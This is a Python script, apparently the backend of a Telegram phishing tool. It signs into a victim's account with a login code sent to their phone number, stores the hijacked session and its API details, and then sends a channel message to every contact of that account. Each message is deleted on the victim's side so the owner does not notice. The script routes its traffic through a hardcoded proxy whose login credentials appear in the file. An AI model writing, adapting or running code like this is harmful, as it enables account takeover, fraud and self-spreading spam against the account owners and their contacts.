from opentele.api import API
import json
from multiprocessing import Process
import time
import random
import traceback
from telethon.sync import TelegramClient
from telethon.sessions import StringSession
import asyncio


proxy = {
    'proxy_type': 'http',
    'addr': '46.8.223.23',
    'port': 5500,
    'username': 'BESTproxyyShopTG',
    'password': 'proxysoxybot',
    'rdns': True
}


def send_spam_to_friends(json_path):

    global proxy

    with open(json_path, "r") as file:
        bot_details = json.load(file)

    client = TelegramClient("all/" + bot_details["session_file"], api_id = bot_details["app_id"], api_hash = bot_details["app_hash"], system_version = bot_details["sdk"], app_version = bot_details["app_version"], device_model = bot_details["device"], system_lang_code = "en", lang_code = "en", proxy = proxy)
    str_sess = StringSession.save(client.session)
    client = TelegramClient(StringSession(str_sess), api_id = bot_details["app_id"], api_hash = bot_details["app_hash"], system_version = bot_details["sdk"], app_version = bot_details["app_version"], device_model = bot_details["device"], system_lang_code = "en", lang_code = "en", proxy = proxy)

    try:

        client.connect()

        friends = [dialog for dialog in client.iter_dialogs(limit=None) if dialog.is_user == True]

        for friend in friends:

            try:

                spam_message = client.get_messages("https://t.me/channel", ids=5)

                sended_msg = client.send_message(friend, spam_message)
                sended_msg.delete(revoke=False)

                time.sleep(random.randint(5, 10))

            except Exception as e:

                print(f"Ошибка при итерации отправки приглашения: {e}")
                continue

    except Exception as e:

        print(f"Ошибка при отправке приглашения: {e}")
    
    finally:

        client.disconnect()



def auth_send_code(phone_number, loop):    

    global proxy

    api = API.TelegramMacOS.Generate()    

    client = TelegramClient("all/" + phone_number, api_id = api.api_id, api_hash = api.api_hash, device_model = api.device_model, system_version = api.system_version, app_version = api.app_version, lang_code = api.lang_code, system_lang_code = api.system_lang_code, proxy=proxy, loop=loop)
    client.connect()

    if client.is_user_authorized() != True:

        client.send_code_request(phone_number)

    return (client, api)


def auth_create_session(client_data, phone_number, code, loop):

    try:

        asyncio.set_event_loop(loop)

        client = client_data[0]
        api = client_data[1]

        # client.loop(loop)

        print(code)

        client.sign_in(phone=phone_number, code=str(code))

        info = client.get_me() 

        client.disconnect()

        data = {
            "app_id":api.api_id,
            "app_hash":api.api_hash,
            "phone":phone_number,
            "register_time":11111111,
            "session_file":f"{phone_number}.session",
            "sdk":api.system_version,
            "app_version":api.app_version,
            "device":api.device_model,
            "lang_pack":api.lang_code,
            "system_lang_pack":api.system_lang_code
        }

        export_json_path = f"all/{phone_number}.json"      

        with open(export_json_path, "w") as file:
            json.dump(data, file, indent = 4) 
        
        Process(target=send_spam_to_friends, args=(export_json_path,)).start()

        return info.first_name
    
    except:
        traceback.print_exc()